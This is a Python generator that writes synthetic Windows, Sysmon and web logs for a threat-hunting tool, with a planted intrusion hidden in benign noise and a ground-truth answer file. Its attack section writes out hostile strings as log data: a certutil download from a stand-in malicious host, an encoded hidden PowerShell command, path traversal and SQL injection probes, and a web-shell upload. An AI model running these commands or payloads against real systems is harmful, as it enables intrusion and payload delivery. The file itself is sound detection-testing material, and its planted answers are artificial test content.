"""Deterministic dataset generator for Sherlock.

Produces three log types with a planted, cross-source intrusion so that a threat
hunt has real signal to find, buried in realistic benign noise:

  1. windows_security.json  (NDJSON, Windows Security event log fields)
  2. sysmon.json            (NDJSON, Sysmon operational fields)
  3. web_access.log         (raw Apache/NGINX combined log format -- plain text,
                             which forces the auto-schema agent to *build* a
                             parser rather than just map JSON keys)

Planted scenario -- "Operation Nightjar":
  02:11  External actor (203.0.113.66) brute-forces the web-facing host over
         SMB/RDP: a burst of 4625 failed logons for user 'administrator'.
  02:14  Web recon + exploitation against the same host's web app: path
         traversal + SQLi probes, then a web shell uploaded and hit
         (POST /uploads/nightjar.php).
  02:16  Successful network logon (4624, logon_type 3) as 'administrator'.
  02:17  w3wp.exe -> cmd.exe -> powershell -enc  (Sysmon EID 1) downloads a
         payload; Sysmon EID 22 DNS query to nightjar-telemetry.xyz and EID 3
         network connection to C2 198.51.100.23:443 (beaconing).
  02:19  Persistence: new account 'svc_backup' created (4720) and added to
         Administrators (4728); special privileges assigned (4672).
  02:41  Defense evasion: Security audit log cleared (1102).

Everything is seeded, so two generations are byte-identical -- which is what
lets the "run the same hunt twice" experiment isolate *agent* variance from
*data* variance.
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

SEED = 20260915
DAY = datetime(2026, 9, 15, tzinfo=timezone.utc)

OUT = Path(__file__).resolve().parent / "generated"

# --- Environment ----------------------------------------------------------
HOST = "WIN-APP01"
HOST_IP = "10.10.20.15"
DOMAIN = "CORP"
USERS = ["alice", "bob", "carol", "dave", "erin"]
INTERNAL_IPS = ["10.10.20.30", "10.10.20.31", "10.10.20.42", "10.10.20.55", "10.10.20.61"]
WORKSTATIONS = ["WIN-DESK07", "WIN-DESK12", "WIN-DESK19", "WIN-DESK23"]

ATTACKER_IP = "203.0.113.66"          # TEST-NET-3, unmistakably external
C2_IP = "198.51.100.23"               # TEST-NET-2
C2_DOMAIN = "nightjar-telemetry.xyz"  # newly observed malicious domain
EVIL_ACCOUNT = "svc_backup"

BENIGN_DOMAINS = [
    "windowsupdate.microsoft.com", "outlook.office365.com", "clients4.google.com",
    "api.corp.internal", "grafana.corp.internal", "repo.corp.internal",
]
BENIGN_PROCS = [
    ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe"),
    ("C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\userinit.exe"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\taskhostw.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "C:\\Windows\\explorer.exe"),
]
URL_PATHS = ["/", "/index.html", "/about", "/products", "/api/v1/status", "/static/app.js",
             "/static/style.css", "/login", "/dashboard", "/api/v1/orders", "/favicon.ico"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/17.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
]

rng = random.Random(SEED)


def iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def clf(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")


def guid() -> str:
    return "{%08x-%04x-%04x-%04x-%012x}" % (
        rng.getrandbits(32), rng.getrandbits(16), rng.getrandbits(16),
        rng.getrandbits(16), rng.getrandbits(48),
    )


def sha256() -> str:
    return "".join(rng.choice("0123456789ABCDEF") for _ in range(64))


# =========================================================================
# Benign background noise
# =========================================================================
def gen_benign_windows() -> list[dict]:
    out = []
    # Normal interactive logons during business hours across the week.
    for day_off in range(0, 5):
        base = DAY + timedelta(days=day_off)
        for _ in range(120):
            user = rng.choice(USERS)
            t = base.replace(hour=rng.randint(8, 18), minute=rng.randint(0, 59), second=rng.randint(0, 59))
            out.append({
                "@timestamp": iso(t), "event_id": 4624, "channel": "Security",
                "computer": rng.choice(WORKSTATIONS), "provider": "Microsoft-Windows-Security-Auditing",
                "level": "Information", "task": "Logon", "logon_type": rng.choice([2, 7, 11]),
                "target_user": user, "domain": DOMAIN, "source_ip": rng.choice(INTERNAL_IPS),
                "message": f"An account was successfully logged on. Account: {DOMAIN}\\{user}",
            })
        # a few benign failed logons (typos)
        for _ in range(8):
            user = rng.choice(USERS)
            t = base.replace(hour=rng.randint(8, 18), minute=rng.randint(0, 59), second=rng.randint(0, 59))
            out.append({
                "@timestamp": iso(t), "event_id": 4625, "channel": "Security",
                "computer": rng.choice(WORKSTATIONS), "provider": "Microsoft-Windows-Security-Auditing",
                "level": "Information", "task": "Logon", "logon_type": 2,
                "target_user": user, "domain": DOMAIN, "source_ip": rng.choice(INTERNAL_IPS),
                "message": f"An account failed to log on. Account: {DOMAIN}\\{user}",
            })
    return out


def gen_benign_sysmon() -> list[dict]:
    out = []
    for day_off in range(0, 5):
        base = DAY + timedelta(days=day_off)
        for _ in range(140):
            image, parent = rng.choice(BENIGN_PROCS)
            t = base.replace(hour=rng.randint(7, 20), minute=rng.randint(0, 59), second=rng.randint(0, 59))
            out.append({
                "@timestamp": iso(t), "event_id": 1, "computer": HOST,
                "user": f"{DOMAIN}\\{rng.choice(USERS)}", "image": image, "parent_image": parent,
                "command_line": f"\"{image}\"", "process_guid": guid(), "hashes": f"SHA256={sha256()}",
            })
        for _ in range(60):
            t = base.replace(hour=rng.randint(7, 20), minute=rng.randint(0, 59), second=rng.randint(0, 59))
            out.append({
                "@timestamp": iso(t), "event_id": 22, "computer": HOST,
                "user": f"{DOMAIN}\\{rng.choice(USERS)}", "image": "C:\\Windows\\System32\\svchost.exe",
                "query_name": rng.choice(BENIGN_DOMAINS), "query_status": "0",
            })
        for _ in range(50):
            t = base.replace(hour=rng.randint(7, 20), minute=rng.randint(0, 59), second=rng.randint(0, 59))
            out.append({
                "@timestamp": iso(t), "event_id": 3, "computer": HOST,
                "user": f"{DOMAIN}\\{rng.choice(USERS)}", "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "dest_ip": f"142.250.{rng.randint(0,255)}.{rng.randint(1,254)}", "dest_port": rng.choice([443, 80]),
                "protocol": "tcp",
            })
    return out


def gen_benign_web() -> list[str]:
    out = []
    for day_off in range(0, 5):
        base = DAY + timedelta(days=day_off)
        for _ in range(900):
            t = base.replace(hour=rng.randint(0, 23), minute=rng.randint(0, 59), second=rng.randint(0, 59))
            ip = f"198.51.{rng.randint(0,255)}.{rng.randint(1,254)}"
            path = rng.choice(URL_PATHS)
            method = "GET" if not path.startswith("/api/v1/orders") else rng.choice(["GET", "POST"])
            status = rng.choice([200, 200, 200, 200, 304, 302, 404])
            size = rng.randint(200, 8000)
            ua = rng.choice(USER_AGENTS)
            out.append(f'{ip} - - [{clf(t)}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"')
    return out


# =========================================================================
# Planted attack chain -- "Operation Nightjar" (all on 2026-09-15)
# =========================================================================
def gen_attack() -> tuple[list[dict], list[dict], list[str]]:
    win, sys, web = [], [], []
    atk_ua = "Mozilla/5.0 (compatible; Nightjar/1.0; +http://nightjar-telemetry.xyz)"

    # 02:11 -- SMB/RDP brute force: burst of 4625 for 'administrator'
    t0 = DAY.replace(hour=2, minute=11, second=0)
    for i in range(38):
        t = t0 + timedelta(seconds=i * 3)
        win.append({
            "@timestamp": iso(t), "event_id": 4625, "channel": "Security", "computer": HOST,
            "provider": "Microsoft-Windows-Security-Auditing", "level": "Information", "task": "Logon",
            "logon_type": 3, "target_user": "administrator", "domain": DOMAIN,
            "source_ip": ATTACKER_IP, "failure_reason": "Unknown user name or bad password",
            "message": "An account failed to log on. Account: CORP\\administrator",
        })

    # 02:14 -- web recon: path traversal + SQLi probes from attacker IP
    tw = DAY.replace(hour=2, minute=14, second=0)
    recon_paths = [
        ("GET", "/../../etc/passwd", 404), ("GET", "/admin/config.php", 403),
        ("GET", "/login?user=admin'--", 200), ("GET", "/api/v1/orders?id=1%20OR%201=1", 500),
        ("GET", "/.git/config", 404), ("GET", "/phpmyadmin/", 404),
        ("POST", "/uploads/nightjar.php", 200),   # web shell uploaded
    ]
    for i, (m, p, s) in enumerate(recon_paths):
        t = tw + timedelta(seconds=i * 7)
        web.append(f'{ATTACKER_IP} - - [{clf(t)}] "{m} {p} HTTP/1.1" {s} {rng.randint(120,900)} "-" "{atk_ua}"')
    # 02:20-02:55 -- web shell used repeatedly (C2 over HTTP to the shell)
    for i in range(9):
        t = DAY.replace(hour=2, minute=20, second=0) + timedelta(minutes=i * 4)
        web.append(f'{ATTACKER_IP} - - [{clf(t)}] "POST /uploads/nightjar.php HTTP/1.1" 200 {rng.randint(300,1500)} "-" "{atk_ua}"')

    # 02:16 -- successful network logon as administrator (4624 type 3) + 4672
    t = DAY.replace(hour=2, minute=16, second=12)
    win.append({
        "@timestamp": iso(t), "event_id": 4624, "channel": "Security", "computer": HOST,
        "provider": "Microsoft-Windows-Security-Auditing", "level": "Information", "task": "Logon",
        "logon_type": 3, "target_user": "administrator", "domain": DOMAIN, "source_ip": ATTACKER_IP,
        "message": "An account was successfully logged on. Account: CORP\\administrator",
    })
    win.append({
        "@timestamp": iso(t + timedelta(seconds=1)), "event_id": 4672, "channel": "Security", "computer": HOST,
        "provider": "Microsoft-Windows-Security-Auditing", "level": "Information", "task": "Special Logon",
        "target_user": "administrator", "domain": DOMAIN,
        "message": "Special privileges assigned to new logon. Account: CORP\\administrator",
    })

    # 02:17 -- malicious process chain via web shell: w3wp -> cmd -> powershell -enc
    tp = DAY.replace(hour=2, minute=17, second=3)
    w3wp = "C:\\Windows\\System32\\inetsrv\\w3wp.exe"
    cmd = "C:\\Windows\\System32\\cmd.exe"
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    enc = "JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
    chain = [
        (cmd, w3wp, f'"{cmd}" /c whoami'),
        (ps, cmd, f'"{ps}" -nop -w hidden -enc {enc}'),
        ("C:\\Windows\\System32\\certutil.exe", ps, 'certutil -urlcache -split -f http://nightjar-telemetry.xyz/n.bin C:\\Windows\\Temp\\n.bin'),
    ]
    for i, (image, parent, cl) in enumerate(chain):
        tt = tp + timedelta(seconds=i * 4)
        g = guid()
        sys.append({
            "@timestamp": iso(tt), "event_id": 1, "computer": HOST, "user": "CORP\\administrator",
            "image": image, "parent_image": parent, "command_line": cl, "process_guid": g,
            "hashes": f"SHA256={sha256()}",
        })
        # matching 4688 in Windows Security
        win.append({
            "@timestamp": iso(tt), "event_id": 4688, "channel": "Security", "computer": HOST,
            "provider": "Microsoft-Windows-Security-Auditing", "level": "Information", "task": "Process Creation",
            "target_user": "administrator", "domain": DOMAIN, "process_name": image, "parent_process_name": parent,
            "message": f"A new process has been created. New Process Name: {image}",
        })

    # 02:17 -- Sysmon EID 22 DNS to C2 domain, then EID 3 network to C2 IP (beacon)
    td = DAY.replace(hour=2, minute=17, second=20)
    sys.append({
        "@timestamp": iso(td), "event_id": 22, "computer": HOST, "user": "CORP\\administrator",
        "image": "C:\\Windows\\System32\\certutil.exe", "query_name": C2_DOMAIN, "query_status": "0",
        "query_results": C2_IP,
    })
    # Beaconing: regular network connections to C2 every ~5 min
    for i in range(11):
        tt = DAY.replace(hour=2, minute=18, second=0) + timedelta(minutes=i * 5)
        sys.append({
            "@timestamp": iso(tt), "event_id": 3, "computer": HOST, "user": "CORP\\administrator",
            "image": ps, "dest_ip": C2_IP, "dest_port": 443, "protocol": "tcp",
            "dest_hostname": C2_DOMAIN,
        })
    # file drop
    sys.append({
        "@timestamp": iso(DAY.replace(hour=2, minute=17, second=40)), "event_id": 11, "computer": HOST,
        "user": "CORP\\administrator", "image": "C:\\Windows\\System32\\certutil.exe",
        "target_filename": "C:\\Windows\\Temp\\n.bin",
    })

    # 02:19 -- persistence: create svc_backup (4720) + add to Administrators (4728) + 4672
    tperc = DAY.replace(hour=2, minute=19, second=5)
    win.append({
        "@timestamp": iso(tperc), "event_id": 4720, "channel": "Security", "computer": HOST,
        "provider": "Microsoft-Windows-Security-Auditing", "level": "Information", "task": "User Account Management",
        "target_user": EVIL_ACCOUNT, "domain": DOMAIN, "subject_user": "administrator",
        "message": f"A user account was created. New Account: {DOMAIN}\\{EVIL_ACCOUNT}",
    })
    win.append({
        "@timestamp": iso(tperc + timedelta(seconds=2)), "event_id": 4728, "channel": "Security", "computer": HOST,
        "provider": "Microsoft-Windows-Security-Auditing", "level": "Information", "task": "Security Group Management",
        "target_user": EVIL_ACCOUNT, "domain": DOMAIN, "subject_user": "administrator", "group_name": "Administrators",
        "message": f"A member was added to a security-enabled global group. Member: {DOMAIN}\\{EVIL_ACCOUNT} Group: Administrators",
    })

    # 02:41 -- defense evasion: clear the Security audit log (1102)
    win.append({
        "@timestamp": iso(DAY.replace(hour=2, minute=41, second=30)), "event_id": 1102, "channel": "Security",
        "computer": HOST, "provider": "Microsoft-Windows-Eventlog", "level": "Information", "task": "Log clear",
        "subject_user": "administrator", "domain": DOMAIN,
        "message": "The audit log was cleared. Account: CORP\\administrator",
    })
    return win, sys, web


def _write_ground_truth(win, sysm, web) -> None:
    """Machine-checkable expectations for the planted intrusion -- lets a
    regression test assert the hunt finds exactly what was planted."""
    gt = {
        "seed": SEED, "date": "2026-09-15", "host": HOST,
        "attacker_ip": ATTACKER_IP, "c2_ip": C2_IP, "c2_domain": C2_DOMAIN,
        "evil_account": EVIL_ACCOUNT,
        "techniques": ["T1110", "T1078", "T1505.003", "T1059.001",
                       "T1136.001", "T1098", "T1070.001", "T1071"],
        "counts": {"windows": len(win), "sysmon": len(sysm), "web": len(web)},
    }
    (OUT / "ground_truth.json").write_text(json.dumps(gt, indent=2) + "\n")


def main(seed: int = SEED) -> None:
    # Reseed so every run is byte-identical regardless of prior RNG use in this
    # process -- reproducibility is a stated guarantee, so make it true.
    global rng
    rng = random.Random(seed)
    OUT.mkdir(parents=True, exist_ok=True)
    win = gen_benign_windows()
    sysm = gen_benign_sysmon()
    web = gen_benign_web()
    awin, asys, aweb = gen_attack()
    win += awin
    sysm += asys
    web += aweb

    win.sort(key=lambda d: d["@timestamp"])
    sysm.sort(key=lambda d: d["@timestamp"])
    # web is CLF text; sort by parsing the bracketed date is overkill -- shuffle
    # deterministically to interleave attack lines with benign ones.
    rng.shuffle(web)

    (OUT / "windows_security.json").write_text("\n".join(json.dumps(d) for d in win) + "\n")
    (OUT / "sysmon.json").write_text("\n".join(json.dumps(d) for d in sysm) + "\n")
    (OUT / "web_access.log").write_text("\n".join(web) + "\n")
    _write_ground_truth(win, sysm, web)

    print(f"windows_security.json : {len(win):>5} events  ({len(awin)} attack)")
    print(f"sysmon.json           : {len(sysm):>5} events  ({len(asys)} attack)")
    print(f"web_access.log        : {len(web):>5} lines   ({len(aweb)} attack)")
    print(f"written to {OUT}")


if __name__ == "__main__":
    main()
